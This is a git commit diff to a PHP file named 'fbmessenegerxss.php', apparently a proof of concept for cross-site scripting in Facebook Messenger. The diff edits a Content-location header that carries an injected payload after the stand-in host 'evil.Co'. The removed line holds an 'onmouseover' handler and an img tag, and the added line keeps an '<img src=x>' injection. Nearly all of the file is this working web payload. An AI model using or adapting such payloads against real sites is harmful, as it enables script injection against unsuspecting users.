1b35aae9b4b406354a955b8873c724124f71d7ed
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-15 00:46:42 +0100

    Update fbmessenegerxss.php

--- fbmessenegerxss.php
+++ fbmessenegerxss.php
@@ -1,7 +1,7 @@
 <?php 
 header('Content-type: application/octet-stream');
 header('X-content-type-options: nosniff');
-header('Content-location: https://evil.Co"onmouseover=aa"a<img src=x>aa=a');
+header('Content-location: https://evil.Co<img src=x>aa=a');
 
 
 ?>
